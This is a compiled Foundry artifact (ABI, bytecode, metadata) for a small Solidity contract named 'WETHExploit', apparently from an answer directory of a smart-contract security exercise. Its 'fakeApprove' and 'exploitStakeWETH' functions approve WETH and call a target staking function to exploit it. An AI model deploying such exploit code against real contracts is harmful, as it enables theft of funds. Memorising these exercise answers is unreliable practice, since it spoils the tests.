{"abi":[{"type":"constructor","inputs":[{"name":"_target","type":"address","internalType":"address"},{"name":"_weth","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"function","name":"exploitStakeWETH","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"fakeApprove","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"weth","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract IWETH"}],"stateMutability":"view"}],"bytecode":{"object":"0x6080604052348015600e575f5ffd5b506040516103b83803806103b8833981016040819052602b916074565b5f80546001600160a01b039384166001600160a01b0319918216179091556001805492909316911617905560a0565b80516001600160a01b0381168114606f575f5ffd5b919050565b5f5f604083850312156084575f5ffd5b608b83605a565b9150609760208401605a565b90509250929050565b61030b806100ad5f395ff3fe608060405234801561000f575f5ffd5b506004361061003f575f3560e01c8063135e045a146100435780633fc8cef31461004d578063979426ee14610096575b5f5ffd5b61004b61009e565b005b60015461006d9073ffffffffffffffffffffffffffffffffffffffff1681565b60405173ffffffffffffffffffffffffffffffffffffffff909116815260200160405180910390f35b61004b610143565b6001545f546040517f095ea7b300000000000000000000000000000000000000000000000000000000815273ffffffffffffffffffffffffffffffffffffffff9182166004820152670de0b6b3a7640000602482015291169063095ea7b3906044016020604051808303815f875af115801561011c573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906101409190610283565b50565b5f8054604051670de0b6b3a7640000602482015273ffffffffffffffffffffffffffffffffffffffff9091169060440160408051601f198184030181529181526020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff167f6e35c74000000000000000000000000000000000000000000000000000000000179052516101d691906102a9565b5f604051808303815f865af19150503d805f811461020f576040519150601f19603f3d011682016040523d82523d5f602084013e610214565b606091505b5050905080610140576040517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820152601160248201527f5374616b652057455448206661696c6564000000000000000000000000000000604482015260640160405180910390fd5b5f60208284031215610293575f5ffd5b815180151581146102a2575f5ffd5b9392505050565b5f82515f5b818110156102c857602081860181015185830152016102ae565b505f92019182525091905056fea2646970667358221220adfea6bdcde024d1f3d64a68edc09f14707c4bdac739813afee66dd041576e5064736f6c634300081c0033","sourceMap":"612:464:0:-:0;;;691:106;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;745:6;:16;;-1:-1:-1;;;;;745:16:0;;;-1:-1:-1;;;;;;745:16:0;;;;;;;;771:19;;;;;;;;;;;612:464;;14:177:1;93:13;;-1:-1:-1;;;;;135:31:1;;125:42;;115:70;;181:1;178;171:12;115:70;14:177;;;:::o;196:293::-;275:6;283;336:2;324:9;315:7;311:23;307:32;304:52;;;352:1;349;342:12;304:52;375:40;405:9;375:40;:::i;:::-;365:50;;434:49;479:2;468:9;464:18;434:49;:::i;:::-;424:59;;196:293;;;;;:::o;:::-;612:464:0;;;;;;","linkReferences":{}},"deployedBytecode":{"object":"0x608060405234801561000f575f5ffd5b506004361061003f575f3560e01c8063135e045a146100435780633fc8cef31461004d578063979426ee14610096575b5f5ffd5b61004b61009e565b005b60015461006d9073ffffffffffffffffffffffffffffffffffffffff1681565b60405173ffffffffffffffffffffffffffffffffffffffff909116815260200160405180910390f35b61004b610143565b6001545f546040517f095ea7b300000000000000000000000000000000000000000000000000000000815273ffffffffffffffffffffffffffffffffffffffff9182166004820152670de0b6b3a7640000602482015291169063095ea7b3906044016020604051808303815f875af115801561011c573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906101409190610283565b50565b5f8054604051670de0b6b3a7640000602482015273ffffffffffffffffffffffffffffffffffffffff9091169060440160408051601f198184030181529181526020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff167f6e35c74000000000000000000000000000000000000000000000000000000000179052516101d691906102a9565b5f604051808303815f865af19150503d805f811461020f576040519150601f19603f3d011682016040523d82523d5f602084013e610214565b606091505b5050905080610140576040517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820152601160248201527f5374616b652057455448206661696c6564000000000000000000000000000000604482015260640160405180910390fd5b5f60208284031215610293575f5ffd5b815180151581146102a2575f5ffd5b9392505050565b5f82515f5b818110156102c857602081860181015185830152016102ae565b505f92019182525091905056fea2646970667358221220adfea6bdcde024d1f3d64a68edc09f14707c4bdac739813afee66dd041576e5064736f6c634300081c0033","sourceMap":"612:464:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;803:78;;;:::i;:::-;;667:17;;;;;;;;;;;;202:42:1;190:55;;;172:74;;160:2;145:18;667:17:0;;;;;;;887:187;;;:::i;803:78::-;845:4;;;858:6;845:29;;;;;:4;858:6;;;845:29;;;457:74:1;866:7:0;547:18:1;;;540:34;845:4:0;;;:12;;430:18:1;;845:29:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;803:78::o;887:187::-;935:12;953:6;;965:54;;1011:7;965:54;;;1038:50:1;953:6:0;;;;;1011:18:1;;965:54:0;;;-1:-1:-1;;965:54:0;;;;;;;;;;;;;;;;;;;;953:67;;;965:54;953:67;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;934:86;;;1038:7;1030:37;;;;;;;1718:2:1;1030:37:0;;;1700:21:1;1757:2;1737:18;;;1730:30;1796:19;1776:18;;;1769:47;1833:18;;1030:37:0;;;;;;;585:277:1;652:6;705:2;693:9;684:7;680:23;676:32;673:52;;;721:1;718;711:12;673:52;753:9;747:16;806:5;799:13;792:21;785:5;782:32;772:60;;828:1;825;818:12;772:60;851:5;585:277;-1:-1:-1;;;585:277:1:o;1099:412::-;1228:3;1266:6;1260:13;1291:1;1301:129;1315:6;1312:1;1309:13;1301:129;;;1413:4;1397:14;;;1393:25;;1387:32;1374:11;;;1367:53;1330:12;1301:129;;;-1:-1:-1;1485:1:1;1449:16;;1474:13;;;-1:-1:-1;1449:16:1;1099:412;-1:-1:-1;1099:412:1:o","linkReferences":{}},"methodIdentifiers":{"exploitStakeWETH()":"979426ee","fakeApprove()":"135e045a","weth()":"3fc8cef3"},"rawMetadata":"{\"compiler\":{\"version\":\"0.8.28+commit.7893614a\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_target\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_weth\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"exploitStakeWETH\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fakeApprove\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"weth\",\"outputs\":[{\"internalType\":\"contract IWETH\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"src/answers/WETHExploit.sol\":\"WETHExploit\"},\"evmVersion\":\"shanghai\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":true,\"runs\":1000},\"remappings\":[\":ds-test/=lib/openzeppelin-contracts-upgradeable/lib/forge-std/lib/ds-test/src/\",\":erc4626-tests/=lib/openzeppelin-contracts-upgradeable/lib/erc4626-tests/\",\":forge-std/=lib/forge-std/src/\",\":openzeppelin-contracts-06/=lib/openzeppelin-contracts-06/contracts/\",\":openzeppelin-contracts-08/=lib/openzeppelin-contracts-08/contracts/\",\":openzeppelin-contracts-upgradeable/=lib/openzeppelin-contracts-upgradeable/\",\":openzeppelin-upgradeable/=lib/openzeppelin-contracts-upgradeable/contracts/\",\":openzeppelin/=lib/openzeppelin-contracts-upgradeable/contracts/\"]},\"sources\":{\"src/answers/WETHExploit.sol\":{\"keccak256\":\"0x805ad62b588df439102bc5608a52e7ba35b7e430aaf74dfcb895ba8a40ecf626\",\"urls\":[\"bzz-raw://d6c0184e256b9303719637dc2f159f83e355f80ad98f7c5b7234f69cb122aba0\",\"dweb:/ipfs/QmP5vRPXCyKUm5MfdC2SXXBMbWUM8ZvRe8PaBqRqQQt6TA\"]}},\"version\":1}","metadata":{"compiler":{"version":"0.8.28+commit.7893614a"},"language":"Solidity","output":{"abi":[{"inputs":[{"internalType":"address","name":"_target","type":"address"},{"internalType":"address","name":"_weth","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"stateMutability":"nonpayable","type":"function","name":"exploitStakeWETH"},{"inputs":[],"stateMutability":"nonpayable","type":"function","name":"fakeApprove"},{"inputs":[],"stateMutability":"view","type":"function","name":"weth","outputs":[{"internalType":"contract IWETH","name":"","type":"address"}]}],"devdoc":{"kind":"dev","methods":{},"version":1},"userdoc":{"kind":"user","methods":{},"version":1}},"settings":{"remappings":["ds-test/=lib/openzeppelin-contracts-upgradeable/lib/forge-std/lib/ds-test/src/","erc4626-tests/=lib/openzeppelin-contracts-upgradeable/lib/erc4626-tests/","forge-std/=lib/forge-std/src/","openzeppelin-contracts-06/=lib/openzeppelin-contracts-06/contracts/","openzeppelin-contracts-08/=lib/openzeppelin-contracts-08/contracts/","openzeppelin-contracts-upgradeable/=lib/openzeppelin-contracts-upgradeable/","openzeppelin-upgradeable/=lib/openzeppelin-contracts-upgradeable/contracts/","openzeppelin/=lib/openzeppelin-contracts-upgradeable/contracts/"],"optimizer":{"enabled":true,"runs":1000},"metadata":{"bytecodeHash":"ipfs"},"compilationTarget":{"src/answers/WETHExploit.sol":"WETHExploit"},"evmVersion":"shanghai","libraries":{}},"sources":{"src/answers/WETHExploit.sol":{"keccak256":"0x805ad62b588df439102bc5608a52e7ba35b7e430aaf74dfcb895ba8a40ecf626","urls":["bzz-raw://d6c0184e256b9303719637dc2f159f83e355f80ad98f7c5b7234f69cb122aba0","dweb:/ipfs/QmP5vRPXCyKUm5MfdC2SXXBMbWUM8ZvRe8PaBqRqQQt6TA"],"license":null}},"version":1},"id":0}